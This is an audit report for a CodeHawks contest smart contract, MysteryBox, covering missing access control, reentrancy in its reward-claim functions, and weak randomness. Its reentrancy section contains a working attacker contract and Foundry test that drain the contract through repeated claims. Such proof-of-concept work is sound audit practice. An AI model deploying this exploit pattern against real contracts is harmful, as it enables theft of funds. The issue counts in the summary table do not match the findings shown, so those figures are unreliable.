# web3MIO Shadowaudit attempt Codehawks First Flight #25: MysteryBox

### Prize Pool

- nSLOC: 86

[//]: # (contest-details-open)

## About the Project

**MysteryBox** is a thrilling protocol where users can purchase mystery boxes containing random rewards! Open your box to reveal amazing prizes, or trade them with others. Will you get lucky and find the rare treasures?

### Actors

- **Owner/Admin (Trusted)** - Can set the price of boxes, add new rewards, and withdraw funds.
- **User/Player** - Can purchase mystery boxes, open them to receive rewards, and trade rewards with others.


# Executive Summary

Issues found

|Severity | Number of issues found|
|---|---|
|High|	3|
|Medium|	1|
|Info|	0|
|Total|	4|


# High Severity Cases

## H1 Anyone can change the contract owner in the MysteryBox::changeOwner function.


### Summary

The MysteryBox::changeOwner function lacks access control and anyone can change the owner contract address of the contract.

```javascript
//@audit MysteryBox::changeOwner lackes access control.
    function changeOwner(address _newOwner) public {
        owner = _newOwner;
    }

```

### Vulnerability Details
In a crucial funtion like this only owner should be able to change owner address but here, anyone can.

#### Here is a code proof
![alt text](image-1.png)

#### Here is the result
![alt text](image.png)

### Impact
Anyone  with access to the contract can change the following at any time:

1\)Being able to change the prices of boxes \
2\)Setting boxes \
3\)Adding rewards 


### Tools Used

Foundry 0.2.0 and the console functionality.

### Recommendations
To fix this vulnerability, implement proper access control in the changeOwner function to ensure that only the current owner of the contract can change the ownership. You can achieve this by adding a modifier, such as onlyOwner, and applying it to the changeOwner function.

```javascript

//@audit: Fixed by adding onlyOwner modifier to restrict access
modifier onlyOwner() {
    require(msg.sender == owner, "Only owner can call this function");
    _;
}

function changeOwner(address _newOwner) public onlyOwner {
    require(_newOwner != address(0), "New owner cannot be the zero address");
    owner = _newOwner;
}

```


## H2 `Mystery:ClaimAllRewards` & `Mystery::ClaimSingleRewards` is prone to Reentrancy attack.


### Summary
Both `Mystery:ClaimAllRewards` & `Mystery::ClaimSingleRewards` make external calls and does not follow the CEI pattern; the the functions send the rewards  before updating the state. 

```javascript
    function claimAllRewards() public {
        uint256 totalValue = 0;
        for (uint256 i = 0; i < rewardsOwned[msg.sender].length; i++) {
            totalValue += rewardsOwned[msg.sender][i].value;
        }
        require(totalValue > 0, "No rewards to claim"); //checks

        (bool success,) = payable(msg.sender).call{value: totalValue}(""); // interaction
        require(success, "Transfer failed");

        delete rewardsOwned[msg.sender]; // effect
       
```

```javascript
    function claimSingleReward(uint256 _index) public {
        require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
        uint256 value = rewardsOwned[msg.sender][_index].value;
        require(value > 0, "No reward to claim"); //Checks

        (bool success,) = payable(msg.sender).call{value: value}("");
        require(success, "Transfer failed"); //Interaction.

        delete rewardsOwned[msg.sender][_index]; //Effect
    }
```

### Vulnerability Details
Contracts with this flaw gives room for an attacker to reenter and drain assets.

**POC**
Add the attacker contract in existing src file:
```javascript 

// SPDX-License-Identifier: DWTFUW
pragma solidity ^0.8.0;
import "./MysteryBox.sol";
contract AttackerContract {
    MysteryBox public mysteryBox;
    address public OWNER;
    
    constructor(address _mysteryBoxAddress,  address _owner) {
        mysteryBox = MysteryBox(_mysteryBoxAddress);
        OWNER = _owner;
    }

    function buyBox() public payable {
       mysteryBox.buyBox{value: 0.1 ether}();
    }
    
    function attack() public payable {
        mysteryBox.openBox();
        mysteryBox.claimAllRewards();
    }
    
    receive() external payable {
        if (address(mysteryBox).balance >= 0.1 ether) {
            mysteryBox.claimAllRewards();
        }
    }
    function claim() external {
     (bool sent,)= OWNER.call{value: address(this).balance}("");
     require(sent);
    }
}
```
**Also add this attack contract to the `TestMysteryBox.t.sol` file**

```javascript
/// other imports as is
+ import "../src/Attacker.sol";
///existing code

function setUp() public {
        owner = makeAddr("owner");
        user1 = address(0x1);
        user2 = address(0x2);

        vm.prank(owner);
        vm.deal(owner, 1 ether);
-       mysteryBox = new MysteryBox();       
+        mysteryBox = new MysteryBox{value: 0.1 ether}();
        console.log("Reward Pool Length:", mysteryBox.getRewardPool().length);
    }
```

```javascript
function testReentrancy() public {
        vm.prank(address(0x6969));
        AttackerContract attacker = new AttackerContract(address(mysteryBox), msg.sender);

        uint256 timestamp = block.timestamp;
        address sender = address(attacker);
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(timestamp, sender))) % 100;
        console.log("winning number:", predictedRandom);
        vm.deal(address(mysteryBox), 2 ether);
        vm.deal(address(attacker), 0.1 ether);
        attacker.buyBox();
        console.log("Contract balance before attack:", address(mysteryBox).balance);
        console.log("attacker balance before attack:", address(attacker).balance);
        attacker.attack();
        console.log("Contract balance after attack:", address(mysteryBox).balance);
        console.log("attacker balance after attack:", address(attacker).balance);
    }
```

After running test, the following result follows:

![alt text](image-2.png)


### Impact

Attacker is able to drain a more than deserved portion of assets in the pool.

### Tools Used

Foundry 0.2.0 and the console functionality.

### Recommendations

Adhere to CEI pattern by updating the state of the contract before making external calls.

```javascript
function claimAllRewards() public {
        uint256 totalValue = 0;
        for (uint256 i = 0; i < rewardsOwned[msg.sender].length; i++) {
            totalValue += rewardsOwned[msg.sender][i].value;
        }
        require(totalValue > 0, "No rewards to claim");
+       delete rewardsOwned[msg.sender];

        (bool success,) = payable(msg.sender).call{value: totalValue}("");
        require(success, "Transfer failed");

-       delete rewardsOwned[msg.sender];
    }

    function claimSingleReward(uint256 _index) public {
        require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
        uint256 value = rewardsOwned[msg.sender][_index].value;
        require(value > 0, "No reward to claim");
        
+       delete rewardsOwned[msg.sender][_index];
        (bool success,) = payable(msg.sender).call{value: value}("");
        require(success, "Transfer failed");

-       delete rewardsOwned[msg.sender][_index];
    }

```


# Medium Severity Cases

## M1 Insecure randomness in the MysteryBox:openBox function. 


### Summary

The MysteryBox:openBox function utilizes an predictable block property to getnerate `randomValue` for the availiable boxes in the contract.

```javascript
//@audit prone to insecure randomness.--Using blocktimestanmp for random number is unsafe.
        uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 100;
```

### Vulnerability Details

Using block.timestamp in combination with msg.sender as a source of randomness is unsafe because it can be influenced by miners within a small range, especially in low-stakes scenarios, enabling them to alter the outcome. Attackers can predict the random value if they can precompute the hash using public information like block.timestamp and their own address (msg.sender).

### Impact
Impact is that users may be able to get Gold Coin on every play if they are running calculations. 

### Tools Used

Foundry 0.2.0 and the console functionality.

### Recommendations
Chainlink VRF (Verifiable Random Function): Chainlink VRF provides provably fair and tamper-resistant randomness.


